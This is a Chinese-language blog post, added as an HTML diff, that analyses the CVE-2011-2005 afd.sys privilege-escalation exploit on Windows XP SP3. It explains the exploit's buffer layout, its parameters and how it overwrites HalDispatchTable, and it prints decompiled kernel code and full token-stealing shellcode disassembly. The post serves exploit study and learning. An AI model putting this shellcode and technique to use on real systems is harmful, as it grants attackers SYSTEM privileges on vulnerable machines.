@@ -1,0 +1,249 @@
+<!doctype html>
+<html class="no-js">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="description" content="">
+  <meta name="keywords" content="">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <title>CVE-2011-2005分析 - c00c's Blog</title>
+
+  <!-- Set render engine for 360 browser -->
+  <meta name="renderer" content="webkit">
+
+  <!-- No Baidu Siteapp-->
+  <meta http-equiv="Cache-Control" content="no-siteapp"/>
+
+  <link rel="icon" type="image/png" href="static/i/favicon.png">
+
+  <!-- Add to homescreen for Chrome on Android -->
+  <meta name="mobile-web-app-capable" content="yes">
+  <link rel="icon" sizes="192x192" href="static/i/app-icon72x72@2x.png">
+
+  <!-- Add to homescreen for Safari on iOS -->
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="apple-mobile-web-app-title" content="Amaze UI"/>
+  <link rel="apple-touch-icon-precomposed" href="static/i/app-icon72x72@2x.png">
+
+  <!-- Tile icon for Win8 (144x144 + tile color) -->
+  <meta name="msapplication-TileImage" content="static/i/app-icon72x72@2x.png">
+  <meta name="msapplication-TileColor" content="#0e90d2">
+
+  <link rel="stylesheet" href="static/css/amazeui.min.css">
+  <link rel="stylesheet" href="static/css/header.css">
+  <link rel="stylesheet" href="static/css/footer.css">
+  <link rel="stylesheet" href="static/css/single.css">
+  <link rel="stylesheet" href="static/css/sidebar.css">
+  <link rel="stylesheet" href="static/css/railscasts.min.css">
+</head>
+<body>
+
+<!--在这里编写你的代码-->
+
+<div id="header">
+	<a href="/">c00c's Blog</a>
+</div>
+
+<div class="am-g body">
+	<div class="am-u-sm-7 am-u-sm-offset-3">
+		<div id="menu" data-am-scrollspy-nav data-am-sticky>
+	<a href="/">Home</a>
+	<a href="about.html">About</a>
+</div>
+		
+		<div id="article">
+			<div class="tags-icon am-icon-tag" id="tags">
+				
+					<span href="#">Exploit</span> 
+				
+					<span href="#">kernel</span> 
+				
+				<span id="date">2017/07/21</span>
+			</div>		
+			<div id="title">CVE-2011-2005分析</div>
+			<div id="content">
+				<h2>0x00.环境</h2>
+<p>系统:：WINXP SP3 </p>
+<p>EXP: <a href="https://www.exploit-db.com/exploits/18176/">exploit-db</a></p>
+<h2>0x01.成因</h2>
+<p>afd.sys中对用户IO参数检查缺陷导致任意地址写定值，被利用来修改系统调用表函数地址，完成执行任意shellcode完成token替换，从而提升权限</p>
+<h2>0x02.EXP分析要点</h2>
+<p>1.inputBuffer为什么要这么构造？</p>
+<p>见IDA F5分析</p>
+<pre class="lang-c"><code>int __fastcall AfdJoinLeaf(_IRP *a1, int a2)
+{
+  v2 = a2;
+  inputLength = *(a2 + 8);
+  if ( inputLength &lt; 0x18 || (a2 = *(a2 + 4)) != 0 &amp;&amp; a2 &lt; 8 )// inputLength &gt;= 0x18
+                                                // outputLength &gt;= 8
+                                                // outputLength == 0
+  {
+    v37 = 0xC000000D;
+    v10 = a1;
+    goto LABEL_72;
+  }
+  if ( a1-&gt;RequestorMode &amp;&amp; inputLength )
+  {
+    if ( *(v2 + 16) &amp; 3 )
+      ExRaiseDatatypeMisalignment();
+    type3InputBuffer = *(v2 + 16);
+    v5 = type3InputBuffer + *(v2 + 8);
+    if ( v5 &lt; type3InputBuffer || v5 &gt; _MmUserProbeAddress )
+      ExRaiseAccessViolation();
+  }
+  inputBuffer = *(v2 + 16);
+  v7 = (inputBuffer + 12);
+  v33 = *(v2 + 8) - 12;                         // 0x108-12
+  *v8 = ExAllocatePoolWithQuotaTag(16, v33 + 48, 0xC9646641);
+  buf = *v8;
+  memset(*v8, 0, 0x30u);
+  qmemcpy((*v8 + 48), v7, v33);
+  if ( *(*v8 + 48) != 1 || v33 &lt; *(buf + 26) + 8 )// *(input+c) == 1
+                                                // *(input+10) &lt;= f4
+    ExRaiseStatus(-1073741811);
+  if ( *(v2 + 4) &amp;&amp; a1-&gt;RequestorMode == UserMode )// outputBufferLength == 0才可以绕过检查
+  {
+    if ( a1-&gt;UserBuffer &gt;= _MmUserProbeAddress )
+      *_MmUserProbeAddress = 0;
+  }
+</code></pre><p>因此只要满足<em>(input+c) == 1和</em>(input+10) &lt;= f4即可<br/><br/></p>
+<p>2.为什么inutBuffer申请的地址是0x1001?</p>
+<p>实际会对齐从0x1000分配<br/><br/></p>
+<p>3.为什么VirtualProtect地址是0x20000？</p>
+<p>python.exe会使用0x20000~0x21000的内存，刚好利用不用自己申请了。<br/><br/></p>
+<p>4.为什么要打开一个没人占用的端口？并在ZwDeviceIoControlFile当做第一个参数？</p>
+<p>还是在AfdJoinLeaf函数中</p>
+<pre class="lang-c"><code>  v14 = *socket;
+  if ( *socket != 0xAFD0u &amp;&amp; v14 != 0xAFD2u &amp;&amp; v14 != 0xAFD1u )
+  {
+LABEL_62:
+    v37 = 0xC000000D;
+    goto LABEL_68;
+  }
+  if ( !v30 )
+  {
+    if ( v14 == 0xAFD1u )
+    {
+      if ( *(socket + 2) != 3 )
+        return AfdDoDatagramConnect(fileObj, v10, 1);
+      v37 = 0;
+      goto LABEL_68;
+    }
+    if ( v14 != 0xAFD0u &amp;&amp; v14 != 0xAFD2u &amp;&amp; v14 != 0xAFD4u &amp;&amp; v14 != 0xAFD6u )
+      goto LABEL_62;
+    v29 = socket + 188;
+    if ( _InterlockedCompareExchange(socket + 47, 3, 0) )
+      goto LABEL_62;
+    if ( *(socket + 2) == 2 )
+    {
+      v37 = AfdCreateConnection(
+              (*(socket + 35) + 16),
+              *(socket + 34),
+              (*(socket + 1) &gt;&gt; 9) &amp; 1,
+              (*(socket + 3) &gt;&gt; 8) &amp; 1,
+              *(socket + 6),
+              &amp;v36);
+      if ( v37 &gt;= 0 )
+        goto LABEL_50;
+</code></pre><p>可以看到要到达LABEL_50，socket状态要是0xAFD0、0xAFD2、0xAFD4、0xAFD6中一个，而如果打开一个不存在的端口，此处的值是0xAFD2。<br/><br/></p>
+<p>5.NtQueryIntervalProfile第一个参数为什么是0x1337?</p>
+<p>在nt中代码如下</p>
+<pre class="lang-c"><code>int __stdcall KeQueryIntervalProfile(int a1)
+{
+  int result; // eax@2
+  int v2; // [sp+0h] [bp-Ch]@5
+  char v3; // [sp+4h] [bp-8h]@6
+  int v4; // [sp+8h] [bp-4h]@7
+  if ( a1 )
+  {
+    if ( a1 == 1 )
+    {
+      result = KiProfileAlignmentFixupInterval;
+    }
+    else
+    {
+      v2 = a1;
+      if ( off_47C03C(1, 12, &amp;v2, &amp;a1) &gt;= 0 &amp;&amp; v3 )  此处调用HaliQuerySystemInformation触发漏洞
+        result = v4;
+      else
+        result = 0;
+    }
+  }
+  else
+  {
+    result = KiProfileInterval;
+  }
+  return result;
+}
+</code></pre><p>其实只要第一个参数非零且不等于1即可，我测试改成0x2是可以的<br/><br/></p>
+<p>6.修改token的shellcode什么作用？</p>
+<pre class="lang-x86asm"><code>000207ba 31c0            xor     eax,eax
+000207bc b836e46f80      mov     eax,offset hal!HaliAcpiMachineStateInit+0xd8 (806fe436)
+000207c1 a340e05480      mov     dword ptr [nt!HalDispatchTable+0x8 (8054e040)],eax
+000207c6 b8babb6f80      mov     eax,offset hal!HalpUnmaskAcpiInterrupt+0x70 (806fbbba)
+000207cb a33ce05480      mov     dword ptr [nt!HalDispatchTable+0x4 (8054e03c)],eax
+000207d0 52              push    edx
+000207d1 53              push    ebx
+000207d2 33c0            xor     eax,eax
+000207d4 648b8024010000  mov     eax,dword ptr fs:[eax+124h] ;kthread
+000207db 8b4044          mov     eax,dword ptr [eax+44h]    ;kprocess
+000207de 8bc8            mov     ecx,eax
+000207e0 8b98c8000000    mov     ebx,dword ptr [eax+0C8h]   ;eprocess token
+000207e6 891d00090200    mov     dword ptr ds:[20900h],ebx  ;token save to 20900
+000207ec 8b8088000000    mov     eax,dword ptr [eax+88h]    ;ActiveProcessLinks
+000207f2 81e888000000    sub     eax,88h                    ;eprocess
+000207f8 81b88400000004000000 cmp dword ptr [eax+84h],4     ;pid,find system.exe
+00020802 75e8            jne     000207ec
+00020804 8b90c8000000    mov     edx,dword ptr [eax+0C8h]   ;system token
+0002080a 8bc1            mov     eax,ecx                    ; eax = current kprocess
+0002080c 8990c8000000    mov     dword ptr [eax+0C8h],edx   ; privilege escalation
+00020812 5b              pop     ebx
+00020813 5a              pop     edx
+00020814 c210            ret     10h
+</code></pre><p><br/></p>
+<p>7.还原token的shellcode什么作用？</p>
+<pre class="lang-x86asm"><code>000207ba 31c0            xor     eax,eax
+000207bc b836e46f80      mov     eax,offset hal!HaliAcpiMachineStateInit+0xd8 (806fe436)
+000207c1 a340e05480      mov     dword ptr [nt!HalDispatchTable+0x8 (8054e040)],eax
+000207c6 b8babb6f80      mov     eax,offset hal!HalpUnmaskAcpiInterrupt+0x70 (806fbbba)
+000207cb a33ce05480      mov     dword ptr [nt!HalDispatchTable+0x4 (8054e03c)],eax
+000207d0 52              push    edx
+000207d1 33c0            xor     eax,eax
+000207d3 648b8024010000  mov     eax,dword ptr fs:[eax+124h]
+000207da 8b4044          mov     eax,dword ptr [eax+44h]
+000207dd 8b1500090200    mov     edx,dword ptr ds:[20900h] ;取保存原token指针
+000207e3 8990c8000000    mov     dword ptr [eax+0C8h],edx   ;还原token
+000207e9 5a              pop     edx
+000207ea c21000          ret     10h
+</code></pre><p><br/></p>
+<p>8.为什么shellcode代码写在0x000207xx地址？</p>
+<p>我们看到上面会调用AfdCreateConnection,单步跟踪找到源头</p>
+<pre class="lang-x86asm"><code>tcpip!TdiConnect+0x426:
+b1e4b7c4 b8070200c0      mov     eax,0C0000207h
+b1e4b7c9 e96802ffff      jmp     tcpip!TdiConnect+0x42b (b1e3ba36)
+</code></pre><p>可以看到传入打开未占用端口的handle，会进入上面代码，从而写入定值0xc0000207,但由于这个高地址属于内核，没办法分配，所以向高1字节写入，相当于替换高3位字节为0x207,从而实现替换系统调用函数指针，实现利用</p>
+
+			</div>
+		</div>
+	</div>
+</div>
+
+<div id="footer">
+	<p>&copy;2015-2017 c00c's Blog.</p>
+</div>
+
+<!--[if (gte IE 9)|!(IE)]><!-->
+<script src="static/js/jquery.min.js"></script>
+<!--<![endif]-->
+<!--[if lte IE 8 ]>
+<script src="http://libs.baidu.com/jquery/1.11.3/jquery.min.js"></script>
+<script src="http://cdn.staticfile.org/modernizr/2.8.3/modernizr.js"></script>
+<script src="static/js/amazeui.ie8polyfill.min.js"></script>
+<![endif]-->
+<script src="static/js/amazeui.min.js"></script>
+<script src="static/js/highlight.min.js"></script>
+<script >hljs.initHighlightingOnLoad();</script>
+</body>
+</html>
